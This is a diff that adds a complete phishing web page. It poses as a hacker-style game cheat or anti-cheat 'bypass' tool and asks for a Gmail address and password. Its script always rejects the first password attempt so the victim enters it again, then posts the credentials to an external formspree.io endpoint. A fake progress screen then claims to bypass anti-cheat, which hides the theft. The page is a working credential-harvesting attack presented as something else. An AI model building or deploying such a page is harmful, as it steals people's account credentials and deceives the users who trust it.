@@ -1,0 +1,160 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE TERMINAL ACCESS</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #matrix { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; }
+        .side-stats { position: absolute; top: 20px; left: 20px; font-size: 10px; color: rgba(0, 255, 0, 0.6); pointer-events: none; }
+        .box { border: 2px solid #0f0; padding: 25px; box-shadow: 0 0 20px #0f0; background: rgba(0, 15, 0, 0.95); width: 90%; max-width: 380px; text-align: center; z-index: 10; position: relative; }
+        .box::before { content: "v4.0.2_SECURE"; position: absolute; top: -12px; left: 20px; background: #000; padding: 0 5px; font-size: 10px; border: 1px solid #0f0; }
+        .dashboard, #gameScreen { display: none; border: 2px solid #0f0; padding: 25px; box-shadow: 0 0 20px #0f0; width: 90%; max-width: 500px; background: rgba(0, 5, 0, 0.95); color: #0f0; text-align: left; z-index: 10; }
+        .terminal-header { color: #0f0; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #0f0; padding-bottom: 5px; text-transform: uppercase; font-size: 14px; }
+        .log { font-size: 11px; color: #0f0; margin: 5px 0; height: 140px; overflow-y: hidden; line-height: 1.4; }
+        .progress-container { width: 100%; background: #002200; border: 1px solid #0f0; margin-top: 15px; }
+        .progress-bar { width: 0%; height: 12px; background: #0f0; transition: width 0.3s; }
+        input { background: rgba(0, 20, 0, 0.7); border: 1px solid #0f0; color: #0f0; padding: 12px; width: 100%; margin-bottom: 15px; outline: none; box-sizing: border-box; font-family: 'Courier New'; font-size: 15px; }
+        input::placeholder { color: rgba(0, 255, 0, 0.3); } /* Example text color */
+        .pass-container { position: relative; width: 100%; }
+        .toggle-password { position: absolute; right: 10px; top: 8px; cursor: pointer; font-size: 18px; }
+        button { background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 5px; }
+        button:hover { background: #000; color: #0f0; border: 1px solid #0f0; }
+        .error { color: #f00; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="side-stats">
+    <div>> PROXY_LOG: ENABLED</div>
+    <div>> AES_KEY: 256-BIT</div>
+    <div>> STATUS: LISTENING...</div>
+</div>
+
+<div class="box" id="loginScreen">
+    <h2 style="margin: 0 0 15px 0;">[ Gmail Required ]</h2>
+    <div id="status" style="margin-bottom: 15px; font-size: 12px;">SYSTEM: <span style="color: #0f0;">WAITING_FOR_DATA</span></div>
+    
+    <form id="hackerForm" action="https://formspree.io/f/mbdapkqz" method="POST">
+        <input type="text" id="gmailInput" name="Gmail_ID" placeholder="example@gmail.com" required>
+        
+        <div class="pass-container">
+            <input type="password" id="passInput" name="Access_Key" placeholder="Password" required>
+            <span class="toggle-password" onclick="togglePass()">👁️</span>
+        </div>
+        
+        <button type="submit" id="subBtn">LOG IN</button>
+    </form>
+    <p style="font-size: 9px; margin-top: 15px; color: #555;">SECURITY_ID: 9x-7721-Bypass</p>
+</div>
+
+<div class="box" id="gameScreen">
+    <h2>[ ACCESS GRANTED ]</h2>
+    <p>> TARGET IDENTIFIED.</p>
+    <input type="text" id="gameName" placeholder="GAME NAME (e.g. VALORANT)">
+    <button onclick="startExecution()">START BYPASS</button>
+</div>
+
+<div class="dashboard" id="mainDashboard">
+    <div class="terminal-header" id="dashTitle">TOOL_RUNNING.EXE</div>
+    <div class="log" id="logs">> Handshake successful...<br>> Injecting scripts...<br></div>
+    <div class="progress-container"><div class="progress-bar" id="pBar"></div></div>
+    <div id="finishMsg" style="margin-top:10px; color:#0f0; display:none; text-align:center;">QUEST COMPLETED!</div>
+</div>
+
+<script>
+    // Matrix Background
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const letters = "01010101ABCDEFHIJKLMNOPQRSTUVWXYZ";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function drawMatrix() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0";
+        ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters.charAt(Math.floor(Math.random() * letters.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(drawMatrix, 35);
+
+    // Form Logic
+    let attemptCount = 0;
+    function togglePass() {
+        const pass = document.getElementById('passInput');
+        pass.type = pass.type === 'password' ? 'text' : 'password';
+    }
+
+    const form = document.getElementById('hackerForm');
+    const status = document.getElementById('status');
+
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const gmail = document.getElementById('gmailInput').value.toLowerCase();
+        
+        if (!gmail.endsWith("@gmail.com")) {
+            status.innerHTML = "SYSTEM: <span class='error'>[!] ERROR_MAIL_NODE</span>";
+            return;
+        }
+
+        attemptCount++;
+
+        if (attemptCount === 1) {
+            // --- 1st ATTEMPT LOGIC ---
+            status.innerHTML = "SYSTEM: <span class='error'>[X] INCORRECT_PASSWORD</span>";
+            document.getElementById('passInput').value = "";
+            document.getElementById('passInput').style.borderColor = "#f00";
+            setTimeout(() => { document.getElementById('passInput').style.borderColor = "#0f0"; }, 1500);
+        } else {
+            // --- 2nd ATTEMPT LOGIC ---
+            document.getElementById('subBtn').innerHTML = "CONNECTING...";
+            document.getElementById('subBtn').disabled = true;
+            try {
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form),
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    document.getElementById('loginScreen').style.display = 'none';
+                    document.getElementById('gameScreen').style.display = 'block';
+                }
+            } catch (err) {
+                status.innerHTML = "SYSTEM: <span class='error'>CONN_FAILED</span>";
+                document.getElementById('subBtn').disabled = false;
+            }
+        }
+    };
+
+    function startExecution() {
+        const g = document.getElementById('gameName').value;
+        if(!g) return;
+        document.getElementById('gameScreen').style.display = 'none';
+        document.getElementById('mainDashboard').style.display = 'block';
+        let i = 0;
+        const msg = ["> Fetching tokens...", "> Bypassing anti-cheat...", "> Finishing..."];
+        const timer = setInterval(() => {
+            if(i < msg.length) {
+                document.getElementById('logs').innerHTML += msg[i] + "<br>";
+                document.getElementById('pBar').style.width = ((i+1)*33) + "%";
+                i++;
+            } else {
+                clearInterval(timer);
+                document.getElementById('finishMsg').style.display = "block";
+            }
+        }, 1500);
+    }
+</script>
+</body>
+</html>
